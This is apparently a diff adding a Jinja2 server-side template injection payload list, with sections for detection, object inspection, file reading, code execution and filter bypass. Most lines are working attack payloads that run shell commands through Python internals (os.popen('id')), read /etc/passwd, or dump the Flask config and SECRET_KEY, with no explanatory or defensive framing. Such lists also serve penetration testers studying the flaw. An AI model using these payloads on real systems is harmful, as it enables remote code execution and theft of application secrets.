@@ -1,0 +1,79 @@
+# Server-Side Template Injection (SSTI) - Jinja2
+# Detection payloads
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{ 7 * 7 }}
+${7*7}
+#{7*7}
+*{7*7}
+
+# Jinja2 object inspection
+{{self.__dict__}}
+{{self.__class__}}
+{{ self }}
+{{ self.__dict__ }}
+{{ self.__class__.__mro__[1].__subclasses__() }}
+
+# Python object access (Jinja2)
+{{ config.items() }}
+{{ self.__class__.__dict__ }}
+{{ self.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['os'].popen('id').read() }}
+
+# Variable enumeration
+{{ get_flashed_messages.__globals__['current_app'].config }}
+{{ get_flashed_messages.__globals__['current_app'].config['SECRET_KEY'] }}
+
+# File read (Jinja2)
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+
+# Code execution via __subclasses__
+{{ ''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+
+# Lipsum object (usually available)
+{{ lipsum.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# Direct filter bypass
+{{ ''.__class__ }}
+{# comment #}{{ 7*7 }}
+{{ 7 * 7 }}
+
+# Using range (less restricted)
+{% for item in ().__class__.__base__.__subclasses__() %}{% if "warning" in item.__name__ %}{{item()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
+
+# URL mapping enumeration
+{{ url_for.__globals__['current_app'].url_map.iter_rules() }}
+
+# Recursive rendering
+{{ self | safe }}
+{{ request.environ }}
+{{ request.environ['SERVER_SOFTWARE'] }}
+
+# CSRF token leak
+{{ csrf_token() }}
+{{ session.get('_id') }}
+
+# Application context
+{% for key, value in config.items() %} {{ key }}: {{ value }} {% endfor %}
+
+# Bypass via string concatenation
+{{ 'config' }}
+{{ 'config'|safe }}
+{{ ['config']|join }}
+
+# Method manipulation
+{% macro x(a=0) %}{{ a.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].popen('id').read() }}{% endmacro %}{{ x(1) }}
+
+# Set exploitation
+{% set x = 1 %}{{ x.__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['os'].popen('id').read() }}
+
+# Filter chain
+{{ ''.__class__.__init__.__globals__['os'] }}
+{{ ''.__class__.__init__.__globals__['__builtins__'] }}
+
+# Import through __import__
+{{ request.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
